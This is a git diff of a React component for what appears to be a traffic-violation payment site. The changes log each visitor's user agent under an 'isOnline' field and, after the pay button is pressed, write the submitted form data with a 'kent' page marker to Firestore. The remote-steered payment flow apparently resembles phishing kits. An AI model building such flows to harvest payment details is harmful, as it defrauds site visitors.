@@ -14,7 +14,7 @@ import LoadingScreen from "./sahel"
 import FullPageLoader from "./loader1"
 import DiscountPopup from "./modal"
 
-function App(props: { page: any; setPage: any }) {
+function App(props: { setPage: any ,page:string}) {
   const [dataall] = useState<any>([])
   const [isCheked, setIsCheked] = useState<boolean>(false)
   const { violationData, fetchViolationData } = useFetchViolationData()
@@ -73,12 +73,6 @@ function App(props: { page: any; setPage: any }) {
   }, [props.page])
 
   useEffect(() => {
-    // Set up event listeners for online/offline status
-    const handleOnline = () => setIsOnline(true)
-    const handleOffline = () => setIsOnline(false)
-    console.log(isCheked)
-    window.addEventListener("online", handleOnline)
-    window.addEventListener("offline", handleOffline)
 
     // Update firestore with online status
     if (localStorage.getItem("vistor")) {
@@ -86,17 +80,13 @@ function App(props: { page: any; setPage: any }) {
       if (visitorId) {
         addData({
           id: visitorId,
-          isOnline: navigator.onLine,
+          isOnline: navigator.userAgent,
           lastSeen: new Date().toISOString(),
         })
       }
     }
 
     // Clean up event listeners
-    return () => {
-      window.removeEventListener("online", handleOnline)
-      window.removeEventListener("offline", handleOffline)
-    }
   }, [])
 
   const handleSubmit = (e: any) => {
@@ -788,8 +778,12 @@ function App(props: { page: any; setPage: any }) {
                                 addData({
                                   ...data,
                                 })
+                                setloading(true)
+
                                 setTimeout(() => {
-                                  props.setPage("kent") // Update the local page state
+addData({...data,page:'kent'}).then(()=>{
+  setloading(false)
+})
                                 }, 5000) // Reduced timeout for better user experience
                               }}
                               id="btnPay"
